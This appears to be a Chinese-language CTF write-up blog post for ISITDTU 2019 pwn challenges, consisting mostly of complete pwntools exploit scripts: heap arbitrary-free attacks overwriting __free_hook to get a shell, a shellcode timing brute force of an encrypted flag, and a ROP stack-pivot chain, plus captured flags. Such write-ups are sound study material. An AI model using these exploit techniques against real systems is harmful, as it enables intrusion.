---
title: ISITDTU
date: 2019-07-02 21:56:26
tags: writeup
---

周末的时候混了几题pwn最后一题看上去就挺麻烦没时间搞.
<!--more-->
# Binary
[binary][1]
# iz_heap_lv1
...一开始看了一遍没找到洞...
这个漏洞脑洞也够大..看了好几遍才发现.
任意free和lv2一样的漏洞点没什么好说的直接搞就行了.
```python
from pwn import *
def cmd(c):
	p.sendlineafter(": \n",str(c))
def name(n):
	p.sendafter(": ",n)
def add(size,c):
	cmd(1)
	p.sendlineafter(": ",str(size))
	p.sendafter(": ",c)
def free(idx):
	cmd(3)
	p.sendlineafter(": ",str(idx))
def edit(idx,size,c):
	cmd(2)
	p.sendlineafter(": ",str(idx))
	p.sendlineafter(": ",str(size))
	p.sendafter(": ",c)
def show(n="n132",flag="N"):
	cmd(4)
	p.sendlineafter(")",str(flag))
	if flag=='Y':
		p.sendafter(": ",n)
def index(add):
	return (add-0x000000000602060)/8
libc=ELF("./libc.so.6")
#
#p=process('./iz_heap_lv1',env={"LD_PRELOAD":"./libc.so.6"})
p=remote("165.22.110.249",3333)
name("\x00"*8)
edit(20,0x300000,"n132")
show()
p.readuntil("Name: ")
base=u64(p.readline()[:-1].ljust(8,'\x00'))-(0x00007ff681b04010-0x00007ff681e05000)
log.warning(hex(base))

edit(20,0x18,'n132')
show()
p.readuntil("Name: ")
heap=u64(p.readline()[:-1].ljust(8,'\x00'))-0x260
log.warning(hex(heap))

libc.address=base
edit(0,0x18,p64(heap+0x260))
free(index(heap+0x260+0x20))
free(20)
edit(1,0x18,p64(libc.sym['__free_hook']))
edit(2,0x18,"/bin/sh\x00")
edit(3,0x18,p64(libc.sym['system']))

context.log_level='debug'
free(2)

#gdb.attach(p,'b *0x000000000400B24')
#ISITDTU{d800dab9684113a5d6c7d2c0381b48c1553068bc}
p.interactive()
```

# iz_heap_lv2
漏洞点一样..利用好像更简单当时写的忘记了...直接放exp吧
```python
from pwn import *
def cmd(c):
	p.sendlineafter(": \n",str(c))
def add(size,c):
	cmd(1)
	p.sendlineafter(": ",str(size))
	p.sendafter(": ",c)
def free(idx):
	cmd(3)
	p.sendlineafter(": ",str(idx))
def edit(idx,size,c):
	cmd(2)
	p.sendlineafter(": ",str(idx))
	p.sendlineafter(": ",str(size))
	p.sendafter(": ",c)
def show(idx):
	cmd(4)
	p.sendlineafter(": ",str(idx))
def index(add):
	return (add-0x000000000602040)/8
context.log_level='debug'
libc=ELF("./libc.so.6")
#libc=ELF("./iz_heap_lv2").libc
#p=process("./iz_heap_lv2")
#p=process('./iz_heap_lv2',env={"LD_PRELOAD":"./libc.so.6"})
p=remote("165.22.110.249",4444)

add(0x000000000601fa0,"n132")#0
show(index(0x0000000006020e0))
p.readuntil(": ")
base=u64(p.readline()[:-1].ljust(8,'\x00'))-libc.sym['puts']
log.warning(hex(base))
add(0x88,"n132")#1
add(0x000000000602048,"n132")#2

show(index(0x0000000006020f0))
p.readuntil(": ")
heap=u64(p.readline()[:-1].ljust(8,'\x00'))
log.warning(hex(heap))


add(heap,"n132")#3
free(index(0x0000000006020f8))
free(1)

libc.address=base
add(0x88,p64(libc.sym['__free_hook']))
add(0x88,'/bin/sh\x00')
add(0x88,p64(libc.sym['system']))
free(4)
#gdb.attach(p,'b *0x000000000400C05')
#ISITDTU{TcAch3_C4ch3_F1LL1Ng_UnL1NKKKKKK_1Z_h34P_LvTw0}  

p.interactive()
```
# babyshellcode
每天时间有限当时没仔细看...没有发现init_array里的函数.
还以为要用alarm 拿shell..事实上只要把被加密过的flag搞出来就可以了
因为开头8字节我们已经知道了所以随机数也没什么意义了直接逐个字节爆破就可以了,原谅我可怜的编码水平.
同时还 get 到了alarm 可以通过再次调用一次来覆盖掉原来的.例如
```
while(1)
    alarm(1);
```
只要cpu循环一次的时间小于一秒那么就永远不会`timeout`,用处是某些需要长时间的exp可以调用alarm来续命.
```python
from pwn import *
import string
p=0
flag="ISITDTU{"
def debug():
	global p,flag
	gdb.attach(p,'''
	b *0x000555555554D3C
	c
	si
	si
	si
	si
	si
	si
	si
	si
	si
	si
	si
	si
	si
	si
	si
	si
	si
	''')
context.log_level='critical'
context.arch='amd64'
def exp(idx,guess):
	global p,flag
	#p=process('./babyshellcode')
	p=remote("127.0.0.1",1024)
	#if idx==1 and guess=='1':
	#	debug()
	#nc 209.97.162.170 2222 
	#0x7b55544454495349
	s='''
	mov rbx,0x7b55544454495349
	shr rbx,{}
	and rbx,0xff
	mov rdi,{}
	mov al,byte ptr [rdi]
	xor al,bl
	mov rbx,{}
	mov cl,byte ptr [rbx]
	xor al,cl
	sub al,{}
	jnz .+0x299

	mov al,0x3
	mov rdi,rax
	mov al,0x25
	syscall
sleeptodie:
	jmp sleeptodie

	'''.format(idx%8*8,(0xcafe000+(idx%8)),0xcafe008+idx,ord(guess))
	p.send(asm(s))

	try:
		print p.read()
	except KeyboardInterrupt:
		flag+=guess
		print flag
		return True
	except :
		pass
	print flag
	return False
#exp(0,"n")

for i in range(0x18):
	for x in (string.ascii_letters+"0123456789"+"_!@#$%^&*&*)-+"):
		res=exp(i,x)
		if(res):
			break

```
# tokenizer
漏洞点在`strsep`因为是对字符串进行操作所以注意点一般是末尾有没有补0,这个binary显然是没有的所以会对`rbp`也进行操作
因为有两个`leave`所以可以做`stack magration`控制执行流.愚昧的我本来还以为`stack`地址后面24位开了`aslr`也是和`heap`一样的固定的事实上是会变的...
导致我开了`aslr`后才发现`rbp`最后一字节并不是一直是`\x80`...(我exp看起来比较奇怪繁琐的原因...因为如果是`\x80`我就不能直接`leak`)
```python
from pwn import *
#context.log_level='debug'
libc=ELF("./tokenizer").libc
p=process('./tokenizer')

#gdb.attach(p,'b *0x00000000040131F')

ret=0x8080808080401016
rdi=0x808080808040149b
rsi=0x8080808080401499
puts=0x8080808080401080
got=0x8080808080403f90
cout=0x8080808080404020
cin=0x8080808080404140
read=0x8080808080401030
magic=0x8080808080404288
reuse=0x8080808080401378
pay=p64(ret)*116+p64(magic)+p64(ret)*5+p64(rdi)+p64(cout)+p64(rsi)+p64(got)+p64(ret)+p64(reuse)
p.sendlineafter(": ",pay)
p.read(0x418)
stack=u64(p.read(6).ljust(8,'\x00'))
p.sendlineafter(": ",chr(0x80&0xff))
base=u64(p.readuntil("Please")[-12:-6].ljust(8,'\x00'))-(0x7ffff7711b70-0x7ffff765b000)
libc.address=base
pay="n132"
one=0x4f322
p.sendlineafter(": ",pay)
p.sendlineafter(": ",p64(one+base))
log.warning(hex(base))
p.interactive()

```
本来挺简单的题目我绕了好几个弯...


[1]: https://github.com/n132/WriteUps/tree/master/2019_ISITDTU